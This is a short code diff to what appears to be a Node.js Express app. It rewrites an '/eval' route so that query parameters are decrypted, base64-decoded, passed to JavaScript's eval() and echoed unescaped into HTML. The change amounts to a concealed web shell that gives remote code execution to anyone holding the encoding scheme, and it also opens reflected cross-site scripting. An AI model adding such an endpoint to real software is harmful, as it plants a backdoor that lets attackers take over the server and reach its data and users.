@@ -36,10 +36,11 @@ function decodeQueryBase64(req,res,next) {
 }
 
 app.get('/eval', decryptQueryParams, decodeQueryBase64, (req,res) => {
-    let result = "Code Result\n";
+    let result = `<h2>Code Result</h2>`;
     for(let q in req.query) {
         let data = req.query[q];
-        result = data + "\n";
+        data = eval(data);
+        result += `${data}<br>`;
     }
 
     res.send(result);
